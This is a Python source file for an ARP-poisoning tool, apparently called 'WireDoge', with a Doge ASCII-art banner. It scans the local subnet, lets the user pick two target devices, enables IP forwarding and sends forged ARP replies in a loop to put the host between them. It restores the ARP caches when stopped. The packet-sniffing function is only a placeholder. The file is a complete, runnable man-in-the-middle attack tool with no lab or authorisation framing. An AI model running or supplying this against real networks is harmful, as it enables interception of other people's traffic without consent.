import scapy.all as scapy
import netifaces
from netaddr import IPAddress
from simple_term_menu import TerminalMenu
import os
import socket
import sys
from tabulate import tabulate
from colorama import init, Fore, Back
from time import sleep
import threading

init()

def print_title():
    os.system('clear')
    print(" _       ___           ____                 ")
    print("| |     / (_)_______  / __ \\____  ____ ____ ")
    print("| | /| / / / ___/ _ \/ / / / __ \\/ __ `/ _ \\")
    print("| |/ |/ / / /  /  __/ /_/ / /_/ / /_/ /  __/")
    print("|__/|__/_/_/   \___/_____/\____/\__, /\___/ ")
    print("                               /____/       ")
    print()
    print(Back.WHITE + Fore.BLACK, end="")
    print("          ▄              ▄      ")
    print("         ▌▒█           ▄▀▒▌     ")
    print("         ▌▒▒█        ▄▀▒▒▒▐     ")
    print("        ▐▄█▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐     ")
    print("      ▄▄▀▒▒▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐     ")
    print("    ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌     ")
    print("   ▐▒▒▒▄▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄▒▌    ")
    print("   ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐    ")
    print("  ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌   ")
    print("  ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌   ")
    print(" ▌▒▒▒▄██▄▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▐   ")
    print(" ▐▒▒▐▄█▄█▌▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒▌  ")
    print(" ▐▒▒▐▀▐▀▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▐   ")
    print("  ▌▒▒▀▄▄▄▄▄▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▌   ")
    print("  ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▒▄▒▒▐    ")
    print("   ▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▄▒▒▒▒▌    ")
    print("     ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀     ")
    print("       ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀       ")
    print("          ▀▀▀▀▀▀▀▀▀▀▀▀          ")
    print(" WoW Much Packets, Very Network ")
    print(Fore.RESET + Back.RESET, end="")
    print()

def adapter_selection():

    adapter_list = scapy.get_if_list()
    adapter_list = [f"[{i}] {adapter}" for i,adapter in enumerate(adapter_list)]
    adapter_list.append("[q] Quit")
    adapter_menu = TerminalMenu(adapter_list, title="Choose a Network Adapter to Spoof from:")    
    adapter_choice = adapter_menu.show()
    adapter = adapter_list[adapter_choice].split('] ')[1]

    if adapter == "Quit":
        os.system("clear")
        exit(0)


    print(f"Using {adapter}...")
    print()

    return adapter

def get_adapter_info(adapter):
    
    ip = scapy.get_if_addr(adapter)
    mac = scapy.get_if_hwaddr(adapter)

    try:
        netmask = netifaces.ifaddresses(adapter)[netifaces.AF_INET][0]['netmask']
    except KeyError:
        sys.exit("This adapter is not connected to a network. Unable to obtain Netmask. Exiting...")

    ip_bytes = socket.inet_aton(ip)

    mask_bytes = socket.inet_aton(netmask)
    network_address_bytes = bytes([ip_bytes[i] & mask_bytes[i] for i in range(4)])
    network_address = socket.inet_ntoa(network_address_bytes)
    
    scan_range = f"{network_address}/{IPAddress(netmask).netmask_bits()}"
    
    print(f"Your IP Address: {ip}")
    print(f"Your MAC Address: {mac}")
    print(f"Your Netmask: {netmask}")
    print()


    return ip,mac,netmask,scan_range

def get_devices(scan_range):

    input("Hit enter to start scanning the network...")
    print()

    netmask_bits = int(scan_range.split('/')[1])

    if netmask_bits < 16:
        print("The network is quite big. This might take a while...")

    print(f"Scanning network {scan_range} for devices")

    broadcast_mac = "ff:ff:ff:ff:ff:ff"
    request = scapy.Ether(dst=broadcast_mac) / scapy.ARP(pdst=scan_range)

    ans, _ = scapy.srp(request, timeout=1, retry=1, verbose=0)
    result = {'IP':[], 'MAC':[]}

    for _,received in ans:
        result['IP'].append(received.psrc)
        result['MAC'].append(received.hwsrc)
    
    print(tabulate(result, headers="keys", tablefmt="pretty"))
    print()

    return result

def get_targets(device_list):

    ip_list = device_list['IP']
    mac_list = device_list['MAC']

    target_list = [f"[{i}] {ip}" for i,ip in enumerate(ip_list)]
    target_list.append("[q] Quit")
    target1_menu = TerminalMenu(target_list, title="Choose a Device as Target 1:")
    target1 = target1_menu.show()

    try:
        target1 = {'IP': ip_list[target1], 'MAC': mac_list[target1]}
    except IndexError:
        os.system("clear")
        exit(0)

    print(f"Target 1: {target1['IP']}")
    
    ip_list = list(filter(lambda x: x!= target1['IP'], ip_list))
    mac_list = list(filter(lambda x: x!= target1['MAC'], mac_list))

    target_list = [f"[{i}] {ip}" for i,ip in enumerate(ip_list)]
    target_list.append("[q] Quit")
    target2_menu = TerminalMenu(target_list, title="Choose a Device as Target 2:")
    target2 = target2_menu.show()
    
    try:
        target2 = {'IP': ip_list[target2], 'MAC': mac_list[target2]}
    except IndexError:
        os.system("clear")
        exit(0)
    
    print(f"Target 2: {target2['IP']}")
    print()
    print(f"Ready to perform ARP Poisoning between {target1['IP']} and {target2['IP']}")

    return target1, target2
    
def arp_poison(target1, target2):
    print("Enabling IP-Forwarding, So Doge is Inconspicuous...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    t = threading.currentThread()

    while not getattr(t, 'stop', False):
        scapy.send(scapy.ARP(op=2, pdst=target1['IP'], hwdst=target1['MAC'], psrc=target2['IP']), verbose=False)
        scapy.send(scapy.ARP(op=2, pdst=target2['IP'], hwdst=target2['MAC'], psrc=target1['IP']), verbose=False)
        sleep(2)

    print("Stopping poisioning...")

    print("Administering the Anti-Doge...")
    scapy.send(scapy.ARP(op=2, pdst=target1['IP'], hwdst=target1['MAC'], psrc=target2['IP'], hwsrc=target2['MAC']), verbose=False)
    scapy.send(scapy.ARP(op=2, pdst=target2['IP'], hwdst=target2['MAC'], psrc=target1['IP'], hwsrc=target1['MAC']), verbose=False) 

    print("Doge has got everything he needs. Disabling IP-Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def sniff_packets():
    print("Inbound Packets here...")
    sleep(0.5)     

def main():
    
    print_title()
    adapter = adapter_selection()
    ip, mac, netmask, scan_range = get_adapter_info(adapter)
    ip_list = get_devices(scan_range)
    target1, target2 = get_targets(ip_list)

    input("Hit Enter to Get Started...")
    os.system("clear")
    # Big booty multi-threading
    arp_thread = threading.Thread(target=arp_poison, args=(target1,target2,))
    arp_thread.start()

    try:
        while True:
            sniff_packets()
    except KeyboardInterrupt:
        print("Stopping Main Thread")
        arp_thread.stop = True
        arp_thread.join()

    
if __name__=="__main__":
    if not os.geteuid() == 0:
        sys.exit("Only root can run this script")
    main()